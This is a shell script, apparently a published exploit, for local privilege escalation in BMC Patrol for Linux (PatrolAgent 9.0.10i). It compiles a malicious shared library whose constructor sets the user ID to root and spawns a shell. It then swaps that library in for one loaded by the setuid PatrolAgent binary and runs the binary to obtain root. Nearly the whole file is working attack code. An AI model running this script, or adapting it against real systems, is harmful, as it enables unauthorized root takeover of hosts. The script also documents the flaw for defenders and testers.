#!/bin/sh

# Exploit Title: BMC Patrol for Linux: privilege escalation from "patrol" user to "root" via PatrolAgent setuid binary 
# Date: 3/07/2019
# Exploit Author: blogresponder (https://github.com/blogresponder)
# Greetz : itm4n (https://github.com/itm4n)
# Vendor Homepage: http://www.bmc.com/
# Version: PatrolAgent V9.0.10i
# Tested on: RHEL x64 

BIN='/users/patrol/Patrol3/Linux-2-6-x86-64-nptl/bin/PatrolAgent'
LIB_TO_SWAP='/users/patrol/common/security/bin_v3.0/linux-2-6-x86-64-nptl/libbmccfgnl.so'
LIB_TO_SWAP_BAK='/users/patrol/common/security/bin_v3.0/linux-2-6-x86-64-nptl/libbmccfgnl.so.bak'
TMP='/tmp/'

if [ ! -f $BIN ];
then
  echo "[-] '$BIN' doesn't exist! Exiting..." && exit 
fi

if [ ! -f $LIB_TO_SWAP ];
then
  echo "[-] '$LIB_TO_SWAP' doesn't exist! Exiting..." && exit
fi
 
echo "[*] Current user: '$(whoami)'"

payload_name=$(head /dev/urandom | md5sum | cut -c1-12)
echo "[*] Writing '$TMP$payload_name.c'..."
cat > "$TMP$payload_name.c" <<- EOM
#include<stdio.h>
#include<stdlib.h>
static void so_hijacking() __attribute__((constructor));
void so_hijacking() {
  setreuid(0, -1);
  system("/bin/sh");
  exit(0);
}
void GetSysInfo() { }
EOM

echo "[*] Compiling $TMP$payload_name.so..."
gcc -shared -o "$TMP$payload_name.so" -fPIC "$TMP$payload_name.c" 2>/dev/null

if [ $? -eq 0 ];
then 
  echo "[+] '$TMP$payload_name.so' has been successfully created."
  echo "[*] Creating backup of '$LIB_TO_SWAP' in '$LIB_TO_SWAP_BAK'"
  cp "$LIB_TO_SWAP" "$LIB_TO_SWAP_BAK"
  echo "[*] Copying '$TMP$payload_name.so' to '$LIB_TO_SWAP'"
  cp "$TMP$payload_name.so" $LIB_TO_SWAP
  echo "[*] Executing vulnerable binary..."
  echo "[+] Should be 'root' now."
  $BIN
else
  echo "[-] Compilation failed! "
fi

echo "[*] Putting back original .so library"
cp $LIB_TO_SWAP_BAK $LIB_TO_SWAP
echo "[*] Deleting temp files..."
if [ -f "$TMP$payload_name.so" ]; then rm "$TMP$payload_name.so"; fi
if [ -f "$TMP$payload_name.c" ]; then rm "$TMP$payload_name.c"; fi
if [ -f "$LIB_TO_SWAP_BAK" ]; then rm "$LIB_TO_SWAP_BAK"; fi
